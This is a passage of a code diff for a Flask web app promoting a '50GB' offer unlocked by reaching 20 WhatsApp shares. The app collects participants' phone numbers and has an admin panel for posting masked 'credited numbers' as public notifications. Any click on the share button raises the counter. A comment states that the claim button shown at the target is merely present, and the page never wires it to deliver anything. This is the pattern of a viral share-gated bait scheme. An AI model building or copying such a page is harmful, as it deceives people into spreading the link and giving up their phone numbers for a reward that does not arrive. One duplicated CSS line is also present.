+            padding: 22px;
+            box-shadow: 0 4px 18px rgba(0,0,0,.08);
+        }
+
+        h1 {
+            text-align: center;
+            margin-top: 0;
+        }
+
+        .offer-title {
+            text-align: center;
+            font-size: 25px;
+        25px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .progress {
+            width: 100%;
+            height: 16px;
+            background: #ddd;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #0077b6;
+            width: {{ percentage }}%;
+        }
+
+        .message {
+            text-align: center;
+            line-height: 1.6;
+            margin: 20px 0;
+        }
+
+        .share-button {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            background: #25D366;
+            color: white;
+            text-decoration: none;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .claim-button {
+            display: block;
+            width: 100%;
+            padding: 17px;
+            border-radius: 10px;
+            background: #0077b6;
+            color: white;
+            text-align: center;
+            font-weight: bold;
+            font-size: 17px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .claim-ready {
+            text-align: center;
+            padding: 15px;
+            background: #e8f7ff;
+            border-radius: 12px;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        .back {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #0077b6;
+            text-decoration: none;
+        }
+
+        .note {
+            text-align: center;
+            color: #777;
+            font-size: 13px;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        {% if reached %}
+
+            <div class="offer-title">
+                🎉 Claim Your 50GB Offer
+            </div>
+
+            <div class="claim-ready">
+
+                You have reached {{ target }}/{{ target }}
+                shares.
+
+                <br><br>
+
+                Your 50GB offer is now ready to be claimed.
+
+            </div>
+
+            <!--
+                IMPORTANT:
+                This button does NOT open WhatsApp.
+                It is simply present on the page at 20/20.
+            -->
+
+            <button
+                type="button"
+                class="claim-button"
+            >
+                CLAIM YOUR 50GB OFFER
+            </button>
+
+        {% else %}
+
+            <h1>
+                Claim Your 50GB
+            </h1>
+
+            <div class="offer-title">
+                🎁 Share to claim your 50GB
+            </div>
+
+            <div class="progress-text">
+                {{ count }} / {{ target }}
+            </div>
+
+            <div class="progress">
+
+                <div
+                    class="progress-bar"
+                    style="width: {{ percentage }}%;"
+                ></div>
+
+            </div>
+
+            <div class="message">
+
+                Share this offer to reach
+                {{ target }} shares and unlock
+                your 50GB offer.
+
+            </div>
+
+            <a
+                href="{{ whatsapp_url }}"
+                class="share-button"
+                id="shareButton"
+            >
+                SHARE TO CLAIM YOUR 50GB
+            </a>
+
+            <div class="note">
+
+                Each time you press the share button,
+                your share count increases by 1.
+
+            </div>
+
+        {% endif %}
+
+        <a
+            href="{{ url_for('home') }}"
+            class="back"
+        >
+            BACK TO OFFER
+        </a>
+
+    </div>
+
+</div>
+
+
+{% if not reached %}
+
+<script>
+
+let alreadyRecorded = false;
+
+document
+    .getElementById("shareButton")
+    .addEventListener("click", async function(event) {
+
+        if (alreadyRecorded) {
+            return;
+        }
+
+        alreadyRecorded = true;
+
+        try {
+
+            await fetch(
+                "{{ url_for(
+                    'record_share',
+                    code=code
+                ) }}",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    }
+                }
+            );
+
+        } catch (error) {
+
+            console.log(
+                "Share count error",
+                error
+            );
+
+        }
+
+    });
+
+</script>
+
+{% endif %}
+
+</body>
+</html>
+""",
+        code=code,
+        campaign=campaign,
+        count=count,
+        target=target,
+        reached=reached,
+        percentage=min(
+            100,
+            int((count / target) * 100)
+            if target > 0 else 0
+        ),
+        whatsapp_url=whatsapp_url
+    )
+
+
+# ============================================================
+# RECORD SHARE CLICK
+# ============================================================
+
+@app.route(
+    "/record-share/<code>",
+    methods=["POST"]
+)
+def record_share(code):
+
+    conn = get_db()
+
+    participant = conn.execute(
+        """
+        SELECT id
+        FROM participants
+        WHERE referral_code = ?
+        """,
+        (code,)
+    ).fetchone()
+
+    if not participant:
+
+        conn.close()
+
+        return jsonify({
+            "success": False
+        }), 404
+
+    campaign = conn.execute(
+        """
+        SELECT referral_target
+        FROM campaign
+        ORDER BY id ASC
+        LIMIT 1
+        """
+    ).fetchone()
+
+    target = int(
+        campaign["referral_target"] or 20
+    )
+
+    current_count = conn.execute(
+        """
+        SELECT COUNT(*) AS total
+        FROM share_clicks
+        WHERE referral_code = ?
+        """,
+        (code,)
+    ).fetchone()["total"]
+
+    # Do not allow the counter to go beyond the target.
+
+    if current_count < target:
+
+        conn.execute("""
+            INSERT INTO share_clicks
+            (
+                referral_code,
+                created_at
+            )
+            VALUES (?, ?)
+        """, (
+            code,
+            datetime.utcnow().isoformat()
+        ))
+
+        conn.commit()
+
+    conn.close()
+
+    return jsonify({
+        "success": True
+    })
+
+
+# ============================================================
+# UPLOADED IMAGE
 # ============================================================
 
 @app.route("/uploads/<filename>")
@@ -1400,150 +1385,35 @@ def uploaded_file(filename):
 
 
 # ============================================================
-# ADMIN LOGIN
+# PUBLIC CREDITED NUMBER API
 # ============================================================
 
-ADMIN_LOGIN = """
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>Admin Login</title>
-
-<style>
-
-body {
-
-    font-family: Arial;
-
-    background: #111;
-
-    padding: 30px;
-
-}
-
-.box {
-
-    max-width: 400px;
-
-    margin: 60px auto;
-
-    background: white;
-
-    padding: 28px;
-
-    border-radius: 18px;
-
-}
-
-input {
-
-    width: 100%;
-
-    box-sizing: border-box;
-
-    padding: 15px;
-
-    margin: 8px 0;
-
-    border:
-        1px solid #ddd;
-
-    border-radius: 10px;
-
-}
-
-button {
-
-    width: 100%;
-
-    padding: 15px;
-
-    background: #008bd2;
-
-    color: white;
-
-    border: 0;
-
-    border-radius: 10px;
-
-    margin-top: 10px;
-
-    font-weight: bold;
-
-}
-
-.error {
-
-    color: red;
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="box">
-
-<h2>
-    Admin Login
-</h2>
-
-
-{% with messages = get_flashed_messages() %}
-
-{% for message in messages %}
-
-<p class="error">
-    {{ message }}
-</p>
-
-{% endfor %}
-
-{% endwith %}
-
-
-<form method="POST">
-
-<input
-    type="text"
-    name="username"
-    placeholder="Username"
-    required
->
-
-
-<input
-    type="password"
-    name="password"
-    placeholder="Password"
-    required
->
-
-
-<button type="submit">
-    LOGIN
-</button>
-
-</form>
-
-</div>
-
-</body>
-
-</html>
-
-"""
-
+@app.route("/api/credited-numbers")
+def api_credited_numbers():
+
+    conn = get_db()
+
+    rows = conn.execute(
+        """
+        SELECT masked_phone
+        FROM credited_numbers
+        ORDER BY id DESC
+        """
+    ).fetchall()
+
+    conn.close()
+
+    return jsonify({
+        "numbers": [
+            row["masked_phone"]
+            for row in rows
+        ]
+    })
+
+
+# ============================================================
+# ADMIN LOGIN
+# ============================================================
 
 @app.route(
     "/secret-admin",
@@ -1556,13 +1426,12 @@ def admin_login():
         username = request.form.get(
             "username",
             ""
-        )
+        ).strip()
 
         password = request.form.get(
             "password",
             ""
         )
-
 
         if (
             username == ADMIN_USERNAME
@@ -1572,313 +1441,381 @@ def admin_login():
             session["admin_logged_in"] = True
 
             return redirect(
-                url_for(
-                    "admin_dashboard"
-                )
+                url_for("admin_dashboard")
             )
 
+        flash("Invalid login details.")
 
-        flash(
-            "Invalid username or password."
-        )
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
 
+    <meta charset="UTF-8">
 
-    return render_template_string(
-        ADMIN_LOGIN
-    )
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Admin Login</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .box {
+            max-width: 420px;
+            margin: 80px auto;
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #0077b6;
+            color: white;
+            border: 0;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+    <h2>Admin Login</h2>
+
+    {% with messages = get_flashed_messages() %}
+
+        {% for message in messages %}
+
+            <p>{{ message }}</p>
+
+        {% endfor %}
+
+    {% endwith %}
+
+    <form method="POST">
+
+        <input
+            type="text"
+            name="username"
+            placeholder="Username"
+            required
+        >
+
+        <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+        >
+
+        <button type="submit">
+            LOGIN
+        </button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
+""")
 
 
 # ============================================================
 # ADMIN DASHBOARD
 # ============================================================
 
-ADMIN_DASHBOARD = """
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>Admin Dashboard</title>
-
-<style>
-
-body {
-
-    font-family: Arial;
-
-    background: #f2f7fa;
-
-    margin: 0;
-
-    padding: 20px;
-
-}
-
-.container {
-
-    max-width: 800px;
-
-    margin: auto;
-
-}
-
-.card {
-
-    background: white;
-
-    padding: 22px;
-
-    margin-bottom: 18px;
-
-    border-radius: 18px;
-
-    box-shadow:
-        0 8px 25px
-        rgba(0, 100, 150, 0.08);
-
-}
-
-.stat {
-
-    font-size: 38px;
-
-    font-weight: 900;
-
-    color: #008bd2;
-
-}
-
-a {
-
-    display: inline-block;
-
-    padding: 13px 18px;
-
-    border-radius: 10px;
-
-    text-decoration: none;
-
-    background: #008bd2;
-
-    color: white;
-
-    font-weight: bold;
-
-    margin-top: 8px;
-
-}
-
-img {
-
-    width: 100%;
-
-    max-height: 350px;
-
-    object-fit: cover;
-
-    border-radius: 13px;
-
-}
-
-table {
-
-    width: 100%;
-
-    border-collapse: collapse;
-
-}
-
-td,
-th {
-
-    padding: 10px;
-
-    border-bottom:
-        1px solid #ddd;
-
-    text-align: left;
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-<h1>
-    Admin Dashboard
-</h1>
-
-
-<div class="card">
-
-<h3>
-    Total Participants
-</h3>
-
-<div class="stat">
-    {{ total }}
-</div>
-
-</div>
-
-
-<div class="card">
-
-<h2>
-    Current Campaign
-</h2>
-
-
-{% if campaign['image'] %}
-
-<img
-    src="{{ url_for(
-        'uploaded_file',
-        filename=campaign['image']
-    ) }}"
->
-
-{% endif %}
-
-
-{% if campaign['heading'] %}
-
-<h2>
-    {{ campaign['heading'] }}
-</h2>
-
-{% endif %}
-
-
-{% if campaign['message'] %}
-
-<p>
-    {{ campaign['message'] }}
-</p>
-
-{% endif %}
-
-
-<p>
-
-Referral target:
-
-<strong>
-    {{ campaign['referral_target'] }}
-</strong>
-
-</p>
-
-
-<a href="{{ url_for('edit_campaign') }}">
-    EDIT / POST CAMPAIGN
-</a>
-
-</div>
-
-
-<div class="card">
-
-<h2>
-    Recent Participants
-</h2>
-
-
-<table>
-
-<tr>
-
-<th>
-    Phone
-</th>
-
-<th>
-    Date
-</th>
-
-</tr>
-
-
-{% for user in participants %}
-
-<tr>
-
-<td>
-    {{ user['phone'] }}
-</td>
-
-<td>
-    {{ user['created_at'][:19] }}
-</td>
-
-</tr>
-
-{% endfor %}
-
-</table>
-
-</div>
-
-
-<a href="{{ url_for('admin_logout') }}">
-    LOGOUT
-</a>
-
-
-</div>
-
-</body>
-
-</html>
-
-"""
-
-
-@app.route(
-    "/secret-admin/dashboard"
-)
+@app.route("/secret-admin/dashboard")
 @admin_required
 def admin_dashboard():
 
     conn = get_db()
 
+    total_users = conn.execute(
+        "SELECT COUNT(*) AS total FROM participants"
+    ).fetchone()["total"]
 
-    total = conn.execute(
-        "SELECT COUNT(*) FROM participants"
-    ).fetchone()[0]
+    total_shares = conn.execute(
+        "SELECT COUNT(*) AS total FROM share_clicks"
+    ).fetchone()["total"]
 
+    total_credited = conn.execute(
+        "SELECT COUNT(*) AS total FROM credited_numbers"
+    ).fetchone()["total"]
 
-    participants = conn.execute(
-        """
-        SELECT phone, created_at
+    recent_participants = conn.execute("""
+        SELECT
+            phone,
+            referral_code,
+            referred_by,
+            created_at
         FROM participants
         ORDER BY id DESC
-        LIMIT 50
-        """
-    ).fetchall()
-
+        LIMIT 30
+    """).fetchall()
 
     conn.close()
 
-
     campaign = get_campaign()
 
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
 
-    return render_template_string(
-        ADMIN_DASHBOARD,
-        total=total,
-        participants=participants,
-        campaign=campaign
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Admin Dashboard</title>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: auto;
+            padding: 20px;
+        }
+
+        .cards {
+            display: grid;
+            grid-template-columns:
+                repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+        }
+
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+        }
+
+        .number {
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        .actions {
+            margin: 20px 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .actions a {
+            background: #0077b6;
+            color: white;
+            padding: 12px 15px;
+            border-radius: 8px;
+            text-decoration: none;
+        }
+
+        .danger {
+            background: #c1121f !important;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            text-align: left;
+        }
+
+        .table-wrap {
+            overflow-x: auto;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>Admin Dashboard</h1>
+
+    <div class="cards">
+
+        <div class="card">
+
+            <div>Total Users</div>
+
+            <div class="number">
+                {{ total_users }}
+            </div>
+
+        </div>
+
+        <div class="card">
+
+            <div>Total Share Clicks</div>
+
+            <div class="number">
+                {{ total_shares }}
+            </div>
+
+        </div>
+
+        <div class="card">
+
+            <div>Credited Numbers</div>
+
+            <div class="number">
+                {{ total_credited }}
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <div class="actions">
+
+        <a href="{{ url_for('admin_edit') }}">
+            Edit Campaign
+        </a>
+
+        <a href="{{ url_for('admin_credited_numbers') }}">
+            Manage Credited Numbers
+        </a>
+
+        <a href="{{ url_for('home') }}">
+            View Promotion
+        </a>
+
+        <a
+            href="{{ url_for('admin_logout') }}"
+            class="danger"
+        >
+            Logout
+        </a>
+
+    </div>
+
+
+    <div class="card">
+
+        <h2>Current Campaign</h2>
+
+        <p>
+            <strong>Heading:</strong>
+            {{ campaign['heading'] }}
+        </p>
+
+        <p>
+            <strong>Referral Target:</strong>
+            {{ campaign['referral_target'] }}
+        </p>
+
+        <p>
+            <strong>Image:</strong>
+            {{ campaign['image'] or 'No image uploaded' }}
+        </p>
+
+    </div>
+
+
+    <br>
+
+
+    <div class="card">
+
+        <h2>Recent Participants</h2>
+
+        <div class="table-wrap">
+
+            <table>
+
+                <tr>
+
+                    <th>Phone</th>
+                    <th>Referral Code</th>
+                    <th>Referred By</th>
+                    <th>Date</th>
+
+                </tr>
+
+                {% for person in recent_participants %}
+
+                <tr>
+
+                    <td>
+                        {{ person['phone'] }}
+                    </td>
+
+                    <td>
+                        {{ person['referral_code'] }}
+                    </td>
+
+                    <td>
+                        {{ person['referred_by'] or '-' }}
+                    </td>
+
+                    <td>
+                        {{ person['created_at'] }}
+                    </td>
+
+                </tr>
+
+                {% endfor %}
+
+            </table>
+
+        </div>
+
+    </div>
+
+</div>
+
+</body>
+</html>
+""",
+        total_users=total_users,
+        total_shares=total_shares,
+        total_credited=total_credited,
+        campaign=campaign,
+        recent_participants=recent_participants
     )
 
 
@@ -1886,265 +1823,14 @@ def admin_dashboard():
 # ADMIN CAMPAIGN EDITOR
 # ============================================================
 
-EDIT_CAMPAIGN = """
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>Post Campaign</title>
-
-<style>
-
-body {
-
-    font-family: Arial;
-
-    background: #f2f7fa;
-
-    padding: 20px;
-
-}
-
-.container {
-
-    max-width: 700px;
-
-    margin: auto;
-
-}
-
-.card {
-
-    background: white;
-
-    padding: 25px;
-
-    border-radius: 18px;
-
-    box-shadow:
-        0 8px 25px
-        rgba(0, 100, 150, 0.08);
-
-}
-
-input,
-textarea {
-
-    width: 100%;
-
-    box-sizing: border-box;
-
-    padding: 15px;
-
-    margin: 8px 0 18px;
-
-    border:
-        1px solid #ddd;
-
-    border-radius: 10px;
-
-    font-size: 16px;
-
-}
-
-textarea {
-
-    min-height: 160px;
-
-}
-
-button {
-
-    width: 100%;
-
-    padding: 16px;
-
-    border: 0;
-
-    border-radius: 11px;
-
-    background:
-        linear-gradient(
-            135deg,
-            #009fe3,
-            #0077ff
-        );
-
-    color: white;
-
-    font-size: 16px;
-
-    font-weight: 900;
-
-}
-
-img {
-
-    width: 100%;
-
-    max-height: 350px;
-
-    object-fit: cover;
-
-    border-radius: 13px;
-
-    margin-bottom: 20px;
-
-}
-
-.back {
-
-    display: inline-block;
-
-    margin-top: 15px;
-
-    text-decoration: none;
-
-    color: #008bd2;
-
-    font-weight: bold;
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-<div class="card">
-
-<h1>
-    Post Campaign
-</h1>
-
-
-<p>
-
-The image uploaded here will appear at the
-very top of the public website.
-
-Your heading and text will appear directly
-under the image.
-
-</p>
-
-
-{% if campaign['image'] %}
-
-<img
-    src="{{ url_for(
-        'uploaded_file',
-        filename=campaign['image']
-    ) }}"
->
-
-{% endif %}
-
-
-<form
-    method="POST"
-    enctype="multipart/form-data"
->
-
-
-<label>
-    Heading
-</label>
-
-
-<input
-    type="text"
-    name="heading"
-    value="{{ campaign['heading'] }}"
-    placeholder="Enter your heading"
->
-
-
-<label>
-    Text
-</label>
-
-
-<textarea
-    name="message"
-    placeholder="Enter your promotional text"
->{{ campaign['message'] }}</textarea>
-
-
-<label>
-    Referral Target
-</label>
-
-
-<input
-    type="number"
-    name="referral_target"
-    value="{{ campaign['referral_target'] }}"
-    min="1"
-    required
->
-
-
-<label>
-    Image
-</label>
-
-
-<input
-    type="file"
-    name="image"
-    accept=".jpg,.jpeg,.png,.webp"
->
-
-
-<button type="submit">
-
-    PUBLISH CAMPAIGN
-
-</button>
-
-
-</form>
-
-
-<a
-    class="back"
-    href="{{ url_for('admin_dashboard') }}"
->
-    ← Back to Dashboard
-</a>
-
-
-</div>
-
-</div>
-
-</body>
-
-</html>
-
-"""
-
-
 @app.route(
     "/secret-admin/edit",
     methods=["GET", "POST"]
 )
 @admin_required
-def edit_campaign():
+def admin_edit():
 
     campaign = get_campaign()
-
 
     if request.method == "POST":
 
@@ -2153,134 +1839,719 @@ def edit_campaign():
             ""
         ).strip()
 
-
         message = request.form.get(
             "message",
             ""
         ).strip()
-
 
         referral_target = request.form.get(
             "referral_target",
             "20"
         ).strip()
 
+        try:
+            referral_target = int(
+                referral_target
+            )
+
+            if referral_target < 1:
+                referral_target = 20
+
+        except ValueError:
+
+            referral_target = 20
+
+        image_name = campaign["image"]
 
         image = request.files.get(
             "image"
         )
 
-
-        current_image = campaign["image"]
-
-
-        # ------------------------------------------
-        # IMAGE
-        # ------------------------------------------
-
         if image and image.filename:
 
-            if not allowed_file(
-                image.filename
-            ):
+            if allowed_file(image.filename):
 
-                flash(
-                    "Invalid image format."
+                filename = secure_filename(
+                    image.filename
                 )
 
-                return redirect(
-                    url_for(
-                        "edit_campaign"
+                filename = (
+                    secrets.token_hex(8)
+                    + "_"
+                    + filename
+                )
+
+                image.save(
+                    os.path.join(
+                        app.config["UPLOAD_FOLDER"],
+                        filename
                     )
                 )
 
-
-            original_name = secure_filename(
-                image.filename
-            )
-
-
-            extension = original_name.rsplit(
-                ".",
-                1
-            )[1].lower()
-
-
-            filename = (
-                secrets.token_hex(10)
-                + "."
-                + extension
-            )
-
-
-            image.save(
-                os.path.join(
-                    app.config["UPLOAD_FOLDER"],
-                    filename
-                )
-            )
-
-
-            current_image = filename
-
-
-        # ------------------------------------------
-        # SAVE
-        # ------------------------------------------
+                image_name = filename
 
         conn = get_db()
 
-
-        conn.execute(
-            """
+        conn.execute("""
             UPDATE campaign
-
-            SET heading = ?,
+            SET
+                heading = ?,
                 message = ?,
                 referral_target = ?,
                 image = ?
-
-            WHERE id = 1
-            """,
-            (
-                heading,
-                message,
-                int(referral_target),
-                current_image
-            )
-        )
-
+            WHERE id = ?
+        """, (
+            heading,
+            message,
+            referral_target,
+            image_name,
+            campaign["id"]
+        ))
 
         conn.commit()
-
         conn.close()
 
+        flash("Campaign updated successfully.")
 
-        flash(
-            "Campaign published successfully!"
+        return redirect(
+            url_for("admin_dashboard")
         )
 
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Edit Campaign</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .box {
+            max-width: 700px;
+            margin: 30px auto;
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+        }
+
+        input,
+        textarea {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 13px;
+            margin: 8px 0 18px;
+        }
+
+        textarea {
+            min-height: 150px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: 0;
+            border-radius: 8px;
+            background: #0077b6;
+            color: white;
+            font-weight: bold;
+        }
+
+        a {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: #0077b6;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+    <h1>Edit Campaign</h1>
+
+    {% with messages = get_flashed_messages() %}
+
+        {% for message in messages %}
+
+            <p>{{ message }}</p>
+
+        {% endfor %}
+
+    {% endwith %}
+
+    <form
+        method="POST"
+        enctype="multipart/form-data"
+    >
+
+        <label>
+            Heading
+        </label>
+
+        <input
+            type="text"
+            name="heading"
+            value="{{ campaign['heading'] }}"
+            required
+        >
+
+        <label>
+            Message
+        </label>
+
+        <textarea
+            name="message"
+            required
+        >{{ campaign['message'] }}</textarea>
+
+        <label>
+            Referral Target
+        </label>
+
+        <input
+            type="number"
+            name="referral_target"
+            value="{{ campaign['referral_target'] }}"
+            min="1"
+            required
+        >
+
+        <label>
+            Promotion Image
+        </label>
+
+        <input
+            type="file"
+            name="image"
+            accept=".jpg,.jpeg,.png,.webp"
+        >
+
+        <button type="submit">
+            SAVE CAMPAIGN
+        </button>
+
+    </form>
+
+    <a href="{{ url_for('admin_dashboard') }}">
+        Back to Dashboard
+    </a>
+
+</div>
+
+</body>
+</html>
+""",
+        campaign=campaign
+    )
+
+
+# ============================================================
+# ADMIN: CREDITED NUMBERS
+# ============================================================
+
+@app.route(
+    "/secret-admin/credited-numbers",
+    methods=["GET", "POST"]
+)
+@admin_required
+def admin_credited_numbers():
+
+    if request.method == "POST":
+
+        raw_numbers = request.form.get(
+            "numbers",
+            ""
+        )
+
+        # Accept one number per line,
+        # or numbers separated by commas.
+
+        raw_numbers = raw_numbers.replace(
+            ",",
+            "\n"
+        )
+
+        numbers = [
+            item.strip()
+            for item in raw_numbers.splitlines()
+            if item.strip()
+        ]
+
+        conn = get_db()
+
+        for phone in numbers:
+
+            masked = mask_phone(phone)
+
+            if not masked:
+                continue
+
+            conn.execute("""
+                INSERT INTO credited_numbers
+                (
+                    masked_phone,
+                    created_at
+                )
+                VALUES (?, ?)
+            """, (
+                masked,
+                datetime.utcnow().isoformat()
+            ))
+
+        conn.commit()
+        conn.close()
+
+        flash(
+            "Credited numbers added successfully."
+        )
 
         return redirect(
             url_for(
-                "admin_dashboard"
+                "admin_credited_numbers"
             )
         )
 
+    conn = get_db()
 
-    return render_template_string(
-        EDIT_CAMPAIGN,
-        campaign=campaign
+    credited = conn.execute("""
+        SELECT
+            id,
+            masked_phone,
+            created_at
+        FROM credited_numbers
+        ORDER BY id DESC
+    """).fetchall()
+
+    conn.close()
+
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Credited Numbers</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+        }
+
+        .box {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 180px;
+            box-sizing: border-box;
+            padding: 13px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            border: 0;
+            border-radius: 8px;
+            background: #0077b6;
+            color: white;
+            font-weight: bold;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            text-align: left;
+        }
+
+        .delete {
+            color: #c1121f;
+        }
+
+        a {
+            color: #0077b6;
+            text-decoration: none;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="box">
+
+        <h1>Credited Numbers</h1>
+
+        <p>
+            Add only numbers that you have actually credited.
+            The public website will only display the masked
+            version.
+        </p>
+
+        <p>
+            Example:
+            08031234567 becomes 0803****567.
+        </p>
+
+        {% with messages = get_flashed_messages() %}
+
+            {% for message in messages %}
+
+                <p>{{ message }}</p>
+
+            {% endfor %}
+
+        {% endwith %}
+
+        <form method="POST">
+
+            <textarea
+                name="numbers"
+                placeholder="Enter one number per line"
+                required
+            ></textarea>
+
+            <button type="submit">
+                ADD CREDITED NUMBERS
+            </button>
+
+        </form>
+
+    </div>
+
+
+    <div class="box">
+
+        <h2>Current Public Notifications</h2>
+
+        <table>
+
+            <tr>
+
+                <th>Number</th>
+                <th>Date</th>
+                <th>Action</th>
+
+            </tr>
+
+            {% for item in credited %}
+
+            <tr>
+
+                <td>
+                    {{ item['masked_phone'] }}
+                </td>
+
+                <td>
+                    {{ item['created_at'] }}
+                </td>
+
+                <td>
+
+                    <a
+                        class="delete"
+                        href="{{ url_for(
+                            'delete_credited_number',
+                            number_id=item['id']
+                        ) }}"
+                        onclick="return confirm(
+                            'Delete this notification?'
+                        )"
+                    >
+                        Delete
+                    </a>
+
+                </td>
+
+            </tr>
+
+            {% endfor %}
+
+        </table>
+
+    </div>
+
+
+    <a href="{{ url_for('admin_dashboard') }}">
+        Back to Dashboard
+    </a>
+
+</div>
+
+</body>
+</html>
+""")
+
+
+# ============================================================
+# DELETE CREDITED NUMBER
+# ============================================================
+
+@app.route(
+    "/secret-admin/credited-numbers/delete/<int:number_id>"
+)
+@admin_required
+def delete_credited_number(number_id):
+
+    conn = get_db()
+
+    conn.execute(
+        """
+        DELETE FROM credited_numbers
+        WHERE id = ?
+        """,
+        (number_id,)
     )
+
+    conn.commit()
+    conn.close()
+
+    return redirect(
+        url_for(
+            "admin_credited_numbers"
+        )
+    )
+
+
+# ============================================================
+# PRIVACY POLICY
+# ============================================================
+
+@app.route("/privacy")
+def privacy():
+
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Privacy Policy</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: auto;
+            background: white;
+            min-height: 100vh;
+            padding: 25px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        p {
+            line-height: 1.7;
+        }
+
+        a {
+            color: #0077b6;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>Privacy Policy</h1>
+
+    <p>
+        We respect your privacy and aim to handle information
+        responsibly.
+    </p>
+
+    <p>
+        Information submitted through this promotion may be
+        used to operate the promotion, maintain participation
+        records and manage referral activity.
+    </p>
+
+    <p>
+        Phone numbers entered for participation are not
+        publicly displayed in full.
+    </p>
+
+    <p>
+        When a credited number is displayed in a public
+        notification, only a masked version is shown.
+    </p>
+
+    <p>
+        Please do not submit information that you are not
+        authorized to provide.
+    </p>
+
+    <a href="{{ url_for('home') }}">
+        Back to Promotion
+    </a>
+
+</div>
+
+</body>
+</html>
+""")
+
+
+# ============================================================
+# TERMS
+# ============================================================
+
+@app.route("/terms")
+def terms():
+
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Terms</title>
+
+    <style>
+
+        body {
+            margin: 0;
+            background: #f0f4f8;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: auto;
+            background: white;
+            min-height: 100vh;
+            padding: 25px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        p {
+            line-height: 1.7;
+        }
+
+        a {
